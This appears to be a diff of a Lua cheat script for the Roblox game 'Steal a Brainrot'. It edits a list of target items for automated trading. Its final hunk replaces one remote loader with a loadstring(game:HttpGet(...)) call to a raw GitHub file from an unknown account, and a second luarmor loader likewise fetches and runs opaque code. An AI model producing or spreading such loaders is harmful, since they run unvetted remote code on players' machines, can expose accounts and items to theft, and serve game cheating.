@@ -5,6 +5,7 @@ getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().TARGET_BRAINROTS = {
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
+    ["Headless Horseman"] = true,
     ["Skibidi Toilet"] = true,
     ["Griffin"] = true,
     ["Hydra Dragon Cannelloni"] = true,
@@ -44,17 +45,19 @@ getgenv().TARGET_BRAINROTS = {
     ["Antonio"] = true,
     ["Garama and Madundung"] = true,
     ["Fishino Clownino"] = true,
-    ["Rico Dinero"] = true,
-    ["Tirilikalika Tirilikalako"] = true,
-    ["Dug dug dug"] = true,
     ["Jolly Jolly Sahur"] = true,
-    ["Headless Horseman"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
     ["Swaggy Bros"] = true,
     ["Chillin Chili"] = true,
-    ["Fragola La La La"] = true
+    ["Los Chillis"] = true,
+    ["Digi Narwhal"] = true,
+    ["Kalika Bros"] = true,
+    ["Gym Bros"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Centrucci Nuclucci"] = true
 }
 task.spawn(function()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dadas45845/limitedhublph/refs/heads/main/morreira"))()
 end)
 task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/e285247e216c4ae3a89d5663b87212bd.lua"))()
